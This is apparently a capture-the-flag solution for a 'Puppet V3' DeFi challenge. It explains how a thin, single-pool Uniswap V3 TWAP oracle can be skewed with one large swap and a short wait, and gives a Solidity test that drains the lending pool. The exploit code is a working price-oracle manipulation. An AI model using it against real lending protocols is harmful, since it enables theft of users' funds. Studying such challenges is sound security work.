## Low trading volume, short time period for TWAP and usage of only a single "source of truth" (Only one Uniswap pool) still allows an attacker to manipulate the attack relatively easy 

## PoC
```solidity 
    function test_puppetV3() public 
    checkSolvedByPlayer 
    {
        // 1. Make a huge swap
        // For simplicity I use the router instead of interact directly with the pool -> https://docs.uniswap.org/contracts/v3/guides/swaps/single-swaps
        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564); // taken from docs
        
        ISwapRouter.ExactInputSingleParams memory params =
        ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: FEE,
            recipient: player,
            deadline: block.timestamp,
            amountIn: 110e18,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        TransferHelper.safeApprove(address(token), address(router), 110e18);

        router.exactInputSingle(params);

        // 2. Wating just a bit of time, if no other huge swap is performed, the manipulation suceeds
        skip(114 seconds);
        weth.approve(address(lendingPool), weth.balanceOf(player));
        lendingPool.borrow(token.balanceOf(address(lendingPool)));
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }
```
Remember to import the router and transfer helper from the Uni lib (yep, you can use named imports)
```solidity
import '@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol';
import '@uniswap/v3-periphery/contracts/libraries/TransferHelper.sol';
```
